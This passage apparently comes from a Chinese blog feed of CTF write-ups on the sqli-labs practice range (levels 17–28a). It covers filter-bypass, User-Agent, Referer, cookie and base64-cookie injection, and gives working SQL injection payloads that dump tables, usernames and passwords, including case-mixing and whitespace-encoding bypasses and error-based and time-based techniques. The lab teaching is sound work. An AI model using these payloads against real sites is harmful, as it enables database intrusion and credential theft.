alt="image-20220317190201694"></p><p>在没有过滤时第一件事是判断注入类型,是字符型还是数字型</p><p>而在有过滤时,判断注入类型后最重要的是判断过滤条件</p><p>在less-25与less-26中,即有正确回显,也有错误回显.找到注入类型后再构造的错误回显前加上字符便可依次看出过滤了哪些字符</p><p>在less-25a与less-26a中,错误回显被关闭,找出被过滤的字符很重要,不过大体与有错误回显时相同(毕竟有正确回显)</p><p>我们知道有一个函数是intval(),作用是获取变量的整数值,但是无错误回显时,我们如何区分是被过滤还是被转化为整形呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval(&#x27;#1&#x27;) = 0</span><br><span class="line">intval(&#x27;1&#x27;) = 1</span><br></pre></td></tr></table></figure><p>只需要在1前面加上#,若被过滤则会正常显示,被转为整形则会显示为0</p><p>注入类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1正常</span><br><span class="line">id=1&#x27;错误</span><br><span class="line">id=1&quot;正常</span><br></pre></td></tr></table></figure><p>说明这里是单引号闭合,但是还是要判断是否有小括号</p><p>判断小括号的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2&#x27; &amp;&amp; &#x27;1&#x27;=&#x27;1 这里浏览器不能使用&amp;要进行url编码即2&#x27;%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><ul><li>若查询语句为where id &#x3D; ‘$id’,查询时是where id&#x3D;’2’&amp;&amp;’1’&#x3D;’1’,结果将是where id&#x3D;’2’,回显会是id&#x3D;2</li><li>若查询语句为where id&#x3D;(‘$id’),查询时是where id&#x3D;(‘2’&amp;&amp;’1’&#x3D;’1’),mysql会将’2’作为布尔值,结果是where id&#x3D;(‘1’),回显会为id&#x3D;1</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;)||&#x27;1&#x27;=(&#x27;1若查询语句有小括号正确回显,若无小括号错误回显</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断字符类型：（带小括号的单引号字符型注入）</span><br><span class="line">?id=1&#x27;        报错，可初步得出是单引号字符型注入</span><br><span class="line">?id=1&#x27;||&#x27; 和?id=1&#x27;||1&#x27; 会让我们误判为就是单引号字符型注入，因为带入源码中id=(&#x27;1&#x27;||&#x27;&#x27;)和id=(&#x27;1&#x27;||&#x27;1&#x27;)返回的结果都会是id=1 所以可以使用下面的语句来快速判断是否带有一个小括号，或者用前面讲的判断是否有小括号的方法也是一样的。</span><br><span class="line">?id=1&#x27;)||(&#x27;           (因为我们过滤了注释，使用这种可以很快的判断出是否是带一个括号的注入点)</span><br></pre></td></tr></table></figure><h2 id="less-27基于错误GET过滤UNION-x2F-SELECT单引号字符型注入"><a href="#less-27基于错误GET过滤UNION-x2F-SELECT单引号字符型注入" class="headerlink" title="less-27基于错误GET过滤UNION&#x2F;SELECT单引号字符型注入"></a>less-27基于错误GET过滤UNION&#x2F;SELECT单引号字符型注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>​    单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&#x27;%26%26 &#x27;1&#x27;=&#x27;1 id=2的用户说明不带括号，id=1的用户说明带括号</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172112819.png" alt="image-20220317211252667"></p><p>到这里我们可以得知,这是单引号字符型注入</p><p>这里查看源码可以发现过滤的字符</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172114296.png" alt="image-20220317211418160"></p><p>发现没有过滤or与and,过滤了几个大小写的union和select但是这里可以使用随机大小写来绕过,过滤了– #&#x2F;**&#x2F;过滤了两次空格,过滤了&#x2F;但是没过滤\</p><p>所以实际上仅仅是过滤了注释和空格,与less-26相似</p><p>这里附上php正则匹配的模式修饰符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">如果设定此修正符，模式中的字符将同时匹配大小写字母。</span><br><span class="line"></span><br><span class="line">m </span><br><span class="line">当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</span><br><span class="line"></span><br><span class="line">s </span><br><span class="line">如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</span><br><span class="line"></span><br><span class="line">x </span><br><span class="line">如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。</span><br><span class="line"></span><br><span class="line">e </span><br><span class="line">如果设定了此修正符，preg_replace() 在替换字符串中对逆向引用作正常的替换，</span><br><span class="line"></span><br><span class="line">?在 . + 和 * 之后 表示非贪婪匹配: *、+和?限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个?就可以实现非贪婪或最小匹配。</span><br></pre></td></tr></table></figure><p>这关可以直接随机大小写seleCt轻松绕过正则匹配,并且这里可以使用%0a代替空格,但是这里多了一种用&#x2F;<em>%0a</em>&#x2F;强行制造空格.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库:</span><br><span class="line">0&#x27;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||/*%0a*/&#x27;1&#x27;=&#x27;1</span><br><span class="line">爆表:</span><br><span class="line">0&#x27;%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;),3||&#x27;1</span><br><span class="line">爆字段:</span><br><span class="line">0&#x27;%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0bAnd%0btable_name=&#x27;users&#x27;%0b%26%26%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">爆数据:</span><br><span class="line">0&#x27;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws(&#x27;$&#x27;,id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h2 id="less-27a基于盲注GET过滤UNION-x2F-SELECT双引号字符型"><a href="#less-27a基于盲注GET过滤UNION-x2F-SELECT双引号字符型" class="headerlink" title="less-27a基于盲注GET过滤UNION&#x2F;SELECT双引号字符型"></a>less-27a基于盲注GET过滤UNION&#x2F;SELECT双引号字符型</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172127387.png" alt="image-20220317212731224"></p><p>贴上源代码</p><ol><li>双引号字符型注入</li><li>没有错误回显,不能进行报错注入,即无法使用updatexml函数等,但是可以进行布尔盲注,因为他有无错误回显,即正确和错误页面返回的页面不同</li><li>可以使用union联合注入,延时注入</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库:</span><br><span class="line">0&quot;%0buniOn%0bsElEct%0b1,database(),3%0bor%0b&quot;1&quot;=&quot;1  </span><br></pre></td></tr></table></figure><h2 id="less-28基于错误的，单引号字符型，过滤了union和select等的注入"><a href="#less-28基于错误的，单引号字符型，过滤了union和select等的注入" class="headerlink" title="less-28基于错误的，单引号字符型，过滤了union和select等的注入"></a>less-28基于错误的，单引号字符型，过滤了union和select等的注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172131134.png" alt="image-20220317213130901"></p><p>单引号报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172133652.png" alt="image-20220317213313527"></p><p>判断有没有小括号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2&#x27;%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>正常回显用户1说明有小括号</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172135604.png" alt="image-20220317213515458"></p><ol><li>发现没有过滤or与and</li><li>过滤了相连的union和select,同时匹配大小写,\s匹配任意空白字符如制表符,换行符,空格等,使用%a0等空格的url编码可以绕过</li><li>过滤了– # 以及&#x2F;**&#x2F;</li><li>过滤了&#x2F;但没过滤\</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库：</span><br><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,database(),3%0bor%0b(&#x27;1&#x27;)=(&#x27;1 </span><br><span class="line">爆表:</span><br><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(table_name)),3%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%0b%26%26%0b(&#x27;1&#x27;)=(&#x27;1</span><br><span class="line">暴字段：</span><br><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0bAnd%0btable_name=&#x27;users&#x27;%0b%26%26%0b(&#x27;1&#x27;)=(&#x27;1</span><br><span class="line">爆数据：</span><br><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><h2 id="less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"></a>less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172142597.png" alt="image-20220317214215457"></p><p>基本和上一关一致</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilbas靶场记录头部注入(四)</title>
      <link href="/ctf/sql/sql-sqlilbas%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5(%E5%9B%9B)/"/>
      <url>/ctf/sql/sql-sqlilbas%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilbas靶场记录头部注入-四"><a href="#sqlilbas靶场记录头部注入-四" class="headerlink" title="sqlilbas靶场记录头部注入(四)"></a>sqlilbas靶场记录头部注入(四)</h1><h2 id="less-18基于错误的用户代理，头部POST注入"><a href="#less-18基于错误的用户代理，头部POST注入" class="headerlink" title="less-18基于错误的用户代理，头部POST注入"></a>less-18基于错误的用户代理，头部POST注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171508777.png" alt="image-20220317150829690"></p><p>打开之后就会回显ip地址</p><p>使用之前的语句发现都显示登录失败</p><p>注意这一关模拟的是,注册之后登录进去,再进行注入的过程,这里登录进去之后显示user agent</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171515985.png" alt="image-20220317151525903"></p><p><strong>extractvalue()注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库:</span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171521157.png" alt="image-20220317152110026"></p><p>这里不使用注释符的原因在于</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p>uagent是在IP和uname之前的，如果注释掉后面的语句，会直接导致Insert语句直接异常，达不到我们查询的目的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆表:</span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and &#x27;</span><br><span class="line">爆列名：</span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)))  and &#x27; </span><br><span class="line">爆列名：</span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)))  and &#x27; </span><br><span class="line">数据显示不全：（extractvalue最大爆32位）</span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelinal&#x27;)))) and &#x27; </span><br></pre></td></tr></table></figure><p>同理updatexml()注入（）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(&#x27;#&#x27;,(database())),0) and &#x27;</span><br></pre></td></tr></table></figure><p>注意：这里并不是URL而是HTTP头，所以+并不会被转义为(空格)，于是末尾的注释符号要变为#。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库:</span><br><span class="line">&#x27; or updatexml(1,concat(&#x27;#&#x27;,(database())),0),&#x27; &#x27;,&#x27; &#x27;)-- #</span><br><span class="line">&#x27; and updatexml(1,concat(&#x27;#&#x27;,(database())),0),&#x27; &#x27;,&#x27; &#x27;)-- #</span><br><span class="line">爆表：</span><br><span class="line">&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),0),&#x27;&#x27;,&#x27;&#x27;)#</span><br><span class="line">爆字段</span><br><span class="line">&#x27; and updatexml(1,concat(&#x27;#&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)),0),&#x27;&#x27;,&#x27;&#x27;)-- #</span><br><span class="line">爆数据：</span><br><span class="line">&#x27; and updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27;#&#x27;,id,username,password) from users limit 0,1) a)),0),&#x27;&#x27;,&#x27;&#x27;)-- #</span><br><span class="line">使用limit偏移注入依次爆出其他用户和密码。</span><br></pre></td></tr></table></figure><p>子查询注入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and (select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select user()),floor(rand()*2))as a from information_schema.tables group by a) b)  and &#x27;</span><br></pre></td></tr></table></figure><h2 id="less-19基于头部的Referer-POST报错注入"><a href="#less-19基于头部的Referer-POST报错注入" class="headerlink" title="less-19基于头部的Referer POST报错注入"></a>less-19基于头部的Referer POST报错注入</h2><p>与上一关基本相似</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue()注入---暴库</span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;</span><br><span class="line">updatexml()注入--暴表</span><br><span class="line">&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),0),&#x27;&#x27;)#</span><br><span class="line">&#x27; and updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),0),&#x27;&#x27;)#</span><br><span class="line">子查询注入---暴字段</span><br><span class="line">&#x27; and  (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x)a) and &#x27;</span><br><span class="line">延时注入：</span><br><span class="line">&#x27; or if(length(database())=8,1,sleep(5))  and &#x27;</span><br></pre></td></tr></table></figure><h2 id="less-20基于错误的cookie头部POST注入"><a href="#less-20基于错误的cookie头部POST注入" class="headerlink" title="less-20基于错误的cookie头部POST注入"></a>less-20基于错误的cookie头部POST注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171543824.png" alt="image-20220317154356654"></p><p>登录进去是这个样子的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登陆后将uname写入Cookie。</span><br><span class="line">在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。</span><br><span class="line">在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；若不存在…</span><br></pre></td></tr></table></figure><p>cookie注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=Dumb&#x27; </span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171547435.png" alt="image-20220317154742304"></p><p>有语法错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: uname=Dumb&#x27; order by 4 -- #</span><br><span class="line">回显Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: uname=Dumb&#x27; order by 3 -- #</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171549174.png" alt="image-20220317154919043"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: uname=D2&#x27; union select 1,2,3 #</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171550857.png" alt="image-20220317155005730"></p><p>login name和passwd这里有回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库:</span><br><span class="line">Cookie: uname=1&#x27; union select 1,2,database() -- #</span><br><span class="line">暴表：</span><br><span class="line">uname=1&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27; -- #</span><br><span class="line">暴字段：</span><br><span class="line">uname=1&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- #&#x27;</span><br><span class="line">暴数据：（这两种其实是一样的）</span><br><span class="line">uname=1&#x27; union select 1,2,group_concat(username,0x7e,password)from security.users -- #</span><br><span class="line">uname=1&#x27; union select 1,2,group_concat(concat_ws(&#x27;-&#x27;,id,username,password)) from users# -- #</span><br></pre></td></tr></table></figure><h2 id="less-21基于base64编码单引号和括号的Cookie注入"><a href="#less-21基于base64编码单引号和括号的Cookie注入" class="headerlink" title="less-21基于base64编码单引号和括号的Cookie注入"></a>less-21基于base64编码单引号和括号的Cookie注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171555377.png" alt="image-20220317155528205"></p><p>发现cookie进行了base64编码 RHVtYg&#x3D;&#x3D;   base64解码后：Dumb</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dumb&#x27; or 1=1 --+ 编码后RHVtYicgb3IgMT0xICM=</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171558394.png" alt="image-20220317155855260"></p><p>回显sql语句错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dumb&#x27;) order by 4-- # 编码RHVtYicpIG9yZGVyIGJ5IDQtLSAj</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171600874.png" alt="image-20220317160059744"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dumb&#x27;) order by 3-- # 编码 RHVtYicpIG9yZGVyIGJ5IDMtLSAj</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171601396.png" alt="image-20220317160151255"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) union select 1,2,3-- # 编码MScpIHVuaW9uIHNlbGVjdCAxLDIsMy0tICM=</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171602727.png" alt="image-20220317160255593"></p><h2 id="less-22基于错误的双引号字符型Cookie注入"><a href="#less-22基于错误的双引号字符型Cookie注入" class="headerlink" title="less-22基于错误的双引号字符型Cookie注入"></a>less-22基于错误的双引号字符型Cookie注入</h2><p>除了多个”闭合其他和上一关基本一致</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #</span><br><span class="line">编码</span><br><span class="line">MSIgb3IgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSktLSAj</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171609918.png" alt="image-20220317160900776"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录update型(三)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95update%E5%9E%8B(%E4%B8%89)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95update%E5%9E%8B(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录update型-三"><a href="#sqlilabs靶场记录update型-三" class="headerlink" title="sqlilabs靶场记录update型(三)"></a>sqlilabs靶场记录update型(三)</h1><h2 id="mysql增删查改"><a href="#mysql增删查改" class="headerlink" title="mysql增删查改"></a>mysql增删查改</h2><h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><p>增加一行数据:insert</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users values(&#x27;15&#x27;,&#x27;test&#x27;,&#x27;test&#x27;);</span><br></pre></td></tr></table></figure><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><p>删数据:delete</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from table_name;</span><br><span class="line">delete from table_name where id=1;</span><br></pre></td></tr></table></figure><p>删结构:drop</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删数据库: drop database 数据库名;</span><br><span class="line">删除表: drop table 表名;</span><br><span class="line">删除表中的: alter table 表名 drop column 列名;</span><br></pre></td></tr></table></figure><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><p>修改:update</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改所有:update 表名 set 列名=&#x27;新的值,非数字加单引号&#x27;;</span><br><span class="line">带条件的修改:update 表名 set 列名=&#x27;新的值,非数字加单引号&#x27; where id=数字;</span><br><span class="line">update users set username=&#x27;test2&#x27; where id=15;</span><br></pre></td></tr></table></figure><h2 id="less-17基于错误的更新查询POST注入"><a href="#less-17基于错误的更新查询POST注入" class="headerlink" title="less-17基于错误的更新查询POST注入"></a>less-17基于错误的更新查询POST注入</h2><p>这关的场景是登录后再修改密码界面注入,而非登录时</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171431618.png" alt="image-20220317143145469"></p><p>那么这里既然我们已经登录进去了,那么肯定知道一个用户名和密码吧.不然咋登进去的呢.这里我们使用dumb用户为例</p><p>这里的页面是进行密码修改,那么肯定会有对数据库里面密码数据的更新.而数据的更新肯定会用到update函数,但是改谁的密码呢,肯定也是需要查询的.</p><p>判断闭合方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=Dumb &amp; passwd=1 回显成功更改密码</span><br><span class="line">uname=Dumb &amp; passwd=1&#x27;version for the right syntax to use near &#x27;Dumb&#x27;&#x27; at line 1</span><br><span class="line">uname=Dumb &amp; passwd=1&quot;  回显成功更改密码</span><br></pre></td></tr></table></figure><p>这里有报错语句,且是单引号进行闭合</p><p>下面是查询username的源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>从这里我们可以看出,在接受用户名之后,会根据uname查询数据库的username和passwd,如果uname存在的话则用passwd替换password,并显示flag1.jpg若不存在则显示slap1.jpg,</p><p>在用户名正确之后,页面能够返回mysql的错误信息,这就可以利用子查询注入在错误信息中返回想要的数据,注意这里的报错语句实update语句,查询用户名语句已经执行完成,并返回成功了</p><p><strong>子查询注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名:</span><br><span class="line">uname=Dumb&amp;passwd=1&#x27; or (select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#x27;Dumb&#x27; -- #</span><br><span class="line">数据库:</span><br><span class="line">uname=Dumb&amp;passwd=1&#x27; or (select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#x27;Dumb&#x27; -- #</span><br></pre></td></tr></table></figure><p><strong>updatexml()注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库:</span><br><span class="line">uname=Dumb&amp;passwd=1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(database())),0) -- #</span><br><span class="line">uname=Dumb&amp;passwd=1&#x27; and updatexml(1,concat(&#x27;#&#x27;,(database())),0) -- #</span><br><span class="line">数据表:</span><br><span class="line">uname=Dumb&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- #</span><br><span class="line">列名:</span><br><span class="line">uname=Dumb&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),0x7e),1) -- #</span><br></pre></td></tr></table></figure><p>爆数据时出现了错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=Dumb&amp;passwd=1&#x27; and updatexml(1,concat(&#x27;#&#x27;,(select concat(id,&#x27;#&#x27;,username,&#x27;#&#x27;,password) from users limit 0,1)),0) -- #</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171455169.png" alt="image-20220317145527078"></p><p>不能在FROM子句中为update指定目标表“users”不能先select表中的某些值，再update这个表（在同一语句中）。</p><p>解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=Dumb&amp;passwd=1&#x27; and updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27;#&#x27;,id,username,password) from users limit 0,1) a)),0) -- #</span><br></pre></td></tr></table></figure><p>这里的错误信息只显示了一部分，使用了limit偏移注入，所以没有一次性输出所有数据（但可以输出最大32个字符的数据，因updatexml最大爆32个字符），</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=Dumb&amp;passwd=1&#x27; and updatexml(1,concat(&#x27;#&#x27;,(select * from (select group_concat(concat_ws(&#x27;#&#x27;,id,username,password)) from users) a)),0) -- #</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171457141.png" alt="image-20220317145720051"></p><p><strong>extractvalue()注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据表:</span><br><span class="line">uname=Dumb&amp;passwd=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录POST型(二)</title>
      <link href="/ctf/sql/sql-%20sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95POST%E5%9E%8B(%E4%BA%8C)/"/>
      <url>/ctf/sql/sql-%20sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95POST%E5%9E%8B(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录POST型-二"><a href="#sqlilabs靶场记录POST型-二" class="headerlink" title="sqlilabs靶场记录POST型(二)"></a>sqlilabs靶场记录POST型(二)</h1><p>接下来就是使用post注入了,这里使用hackbar插件 配合burp</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162052989.png" alt="image-20220316205212924"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162052349.png" alt="image-20220316205225285"></p><p>抓包发现post了uname和passwd两个数据</p><h2 id="less-11基于错误的-单引号-字符型"><a href="#less-11基于错误的-单引号-字符型" class="headerlink" title="less-11基于错误的- 单引号 -字符型"></a>less-11基于错误的- 单引号 -字符型</h2><p>先基本测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1 &amp; passwd=1无法登录无回显</span><br><span class="line">uname=1&#x27; &amp; passwd=1version for the right syntax to use near &#x27;1&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">uname=1 &amp; passwd=1&#x27; version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span 